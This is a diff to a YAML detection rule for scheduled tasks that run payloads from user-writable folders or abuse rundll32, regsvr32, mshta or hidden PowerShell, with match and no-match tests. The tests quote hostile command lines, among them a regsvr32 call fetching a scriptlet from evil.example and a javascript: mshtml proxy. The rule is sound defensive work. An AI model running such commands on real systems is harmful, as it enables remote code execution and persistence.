@@ -2,28 +2,45 @@ kind: event
 id: suspicious_scheduled_task
 title: Scheduled task launching from a suspicious location
 description: >
-  A scheduled task whose action runs an executable from a user-writable or
-  staging directory (ProgramData, Temp, AppData, Public, Downloads) or a known
-  living-off-the-land interpreter with an encoded/hidden command. Scheduled
-  tasks are a durable persistence and execution mechanism; attacker-created
-  tasks routinely point at payloads dropped in these locations.
+  A scheduled task whose action runs a payload from a user-writable or staging
+  directory (ProgramData, Temp, AppData, Public, Downloads, PerfLogs), an
+  encoded / hidden PowerShell or mshta command, or rundll32 / regsvr32 used the
+  way attackers use them: loading a DLL from outside System32 / SysWOW64 or a
+  network path, a "DLL" with a non-DLL extension, or a script / URL proxy
+  (javascript:, mshtml, url.dll, scrobj.dll /i:http). Built-in Windows tasks
+  that call rundll32 with System32 DLLs, Defender's own scan tasks and the
+  per-user OneDrive / Teams updaters do not match. Scheduled tasks are a
+  durable persistence and execution mechanism; attacker-created tasks
+  routinely point at payloads dropped in these locations.
 severity: high
 attack:
   - T1053.005
+  - T1218.011
+  - T1218.010
 artefacts:
   - ScheduledTask
 detection:
   any:
-    - match:
-        field: process.command_line
-        op: contains
-        values:
-          - "\\ProgramData\\"
-          - "\\Temp\\"
-          - "\\AppData\\"
-          - "\\Users\\Public\\"
-          - "\\Downloads\\"
-          - "\\PerfLogs\\"
+    # Payload in a user-writable / staging directory, minus known Microsoft updaters.
+    - all:
+        - match:
+            field: process.command_line
+            op: contains
+            values:
+              - "\\ProgramData\\"
+              - "\\Temp\\"
+              - "\\AppData\\"
+              - "\\Users\\Public\\"
+              - "\\Downloads\\"
+              - "\\PerfLogs\\"
+        - not:
+            match:
+              field: process.command_line
+              op: regex
+              values:
+                - '(?i)\\ProgramData\\Microsoft\\Windows Defender\\Platform\\[^\\]+\\(MpCmdRun|MsMpEng)\.exe'
+                - '(?i)\\AppData\\Local\\Microsoft\\(OneDrive|Teams)\\[^"]*\\?(OneDriveStandaloneUpdater|Update)\.exe'
+    # Encoded / hidden PowerShell, mshta.
     - match:
         field: process.command_line
         op: contains
@@ -34,5 +51,48 @@ detection:
           - "-w hidden"
           - "-windowstyle hidden"
           - "mshta"
-          - "rundll32"
-          - "regsvr32 /s /u /i:"
+    # rundll32 / regsvr32 as a script or URL proxy.
+    - match:
+        field: process.command_line
+        op: regex
+        values:
+          - '(?i)\b(rundll32|regsvr32)(\.exe)?\b.*(javascript:|vbscript:|mshtml,|runhtmlapplication|url\.dll,|ieframe\.dll,|shdocvw\.dll,|advpack\.dll,|setupapi\.dll,installhinfsection|scrobj\.dll|/i:\s*https?:)'
+    # A "DLL" with a non-DLL extension (loader trick).
+    - match:
+        field: process.command_line
+        op: regex
+        values:
+          - '(?i)\b(rundll32|regsvr32)(\.exe)?["'']?\s+(/[a-z:]+\s+)*["'']?[^\s,"'']+\.(dat|tmp|txt|log|bin|db|ini|png|jpg|jpeg|gif|bmp|ico|cfg|xml|json)\b'
+    # A DLL loaded by path from outside System32 / SysWOW64 (bare DLL names
+    # resolve from System32 and are left alone).
+    - all:
+        - match:
+            field: process.command_line
+            op: regex
+            values:
+              - '(?i)\b(rundll32|regsvr32)(\.exe)?["'']?\s+(/[a-z:]+\s+)*["'']?[^\s,"'']*[\\/]'
+        - not:
+            match:
+              field: process.command_line
+              op: regex
+              values:
+                - '(?i)\b(rundll32|regsvr32)(\.exe)?["'']?\s+(/[a-z:]+\s+)*["'']?(%windir%|%systemroot%|[a-z]:\\windows)\\(system32|syswow64)\\'
+tests:
+  match:
+    - { artefact: scheduled_task, process.command_line: "C:\\Windows\\System32\\rundll32.exe C:\\ProgramData\\Updater\\core.dll,Start" }
+    - { artefact: scheduled_task, process.command_line: "rundll32.exe \\\\10.20.4.15\\share\\x.dll,Run" }
+    - { artefact: scheduled_task, process.command_line: "rundll32.exe D:\\tools\\beacon.dll,StartW" }
+    - { artefact: scheduled_task, process.command_line: "rundll32.exe C:\\Users\\bob\\Pictures\\logo.png,DllRegisterServer" }
+    - { artefact: scheduled_task, process.command_line: "regsvr32 /s /n /u /i:http://evil.example/a.sct scrobj.dll" }
+    - { artefact: scheduled_task, process.command_line: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert(1)" }
+    - { artefact: scheduled_task, process.command_line: "powershell.exe -nop -w hidden -enc SQBFAFgA" }
+    - { artefact: scheduled_task, process.command_line: "C:\\Users\\Public\\svc.exe" }
+  no_match:
+    - { artefact: scheduled_task, process.command_line: "%windir%\\system32\\rundll32.exe %windir%\\system32\\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask" }
+    - { artefact: scheduled_task, process.command_line: "%windir%\\system32\\rundll32.exe Startupscan.dll,SusRunTask" }
+    - { artefact: scheduled_task, process.command_line: "rundll32.exe sysmain.dll,PfSvWsSwapAssessmentTask" }
+    - { artefact: scheduled_task, process.command_line: "C:\\Windows\\system32\\rundll32.exe C:\\Windows\\system32\\dfdts.dll,DfdGetDefaultPolicyAndSMART" }
+    - { artefact: scheduled_task, process.command_line: "%SystemRoot%\\SysWOW64\\rundll32.exe %SystemRoot%\\SysWOW64\\shell32.dll,Control_RunDLL" }
+    - { artefact: scheduled_task, process.command_line: "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MpCmdRun.exe Scan -ScheduleJob -ScanTrigger 55" }
+    - { artefact: scheduled_task, process.command_line: "C:\\Users\\bob\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe /reporting" }
+    - { artefact: scheduled_task, process.command_line: "C:\\Program Files\\Google\\Update\\GoogleUpdate.exe /ua /installsource scheduler" }
